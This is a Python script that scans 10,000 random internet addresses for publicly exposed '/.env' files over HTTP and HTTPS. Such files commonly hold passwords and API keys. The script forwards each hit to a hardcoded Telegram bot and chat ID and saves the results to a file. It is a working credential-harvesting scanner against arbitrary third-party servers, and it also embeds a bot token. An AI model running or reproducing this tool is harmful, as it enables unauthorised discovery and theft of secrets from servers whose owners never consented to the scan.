import random
import socket
import os
from ping3 import ping
import requests
import telebot


bot = telebot.TeleBot('6588863996:AAGszrTXYQfr1ggDCvJos4al4fKBjX_qkQM')


def generate_random_ip():
    # Generate a random IP address
    return f"{random.randint(1, 255)}.{random.randint(0, 255)}.{random.randint(0, 255)}.{random.randint(1, 254)}"

def is_ip_alive(ip_address, port):
    # Check if the IP is live by attempting to connect to it on the specified port
    try:
        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
            s.settimeout(5)  # Set a timeout for the connection attempt
            s.connect((ip_address, port))
        return True
    except OSError:
        return False

def main():
    num_ips_to_generate = 10000  # Number of random IPs to generate and check
    live_ips = []

    for _ in range(num_ips_to_generate):
        random_ip = generate_random_ip()
        print(f"Checking IP: {random_ip}")  # Print the current IP address being checked

        # Try both HTTP and HTTPS requests
        for proto in ['https://', 'http://']:
            try:
                response = requests.get(f"{proto}{random_ip}/.env", timeout=10)
                if response.status_code == 200:
                    print(f"Live IP found: {proto}{random_ip}/.env")
                    user_id = 6374453982
                    inf = f"Live IP found: {proto}{random_ip}/.env"    
                    bot.send_message(chat_id=user_id, text=inf, parse_mode='HTML')
                    live_ips.append(f"{proto}{random_ip}/.env")
            except requests.exceptions.RequestException:
                pass

    if live_ips:
        with open("hit.txt", "w") as live_file:
            for live_ip in live_ips:
                live_file.write(f"{live_ip}\n")
        print("Live IPs saved to hit.txt")
    else:
        print("No live IPs found.")


if __name__ == "__main__":
    main()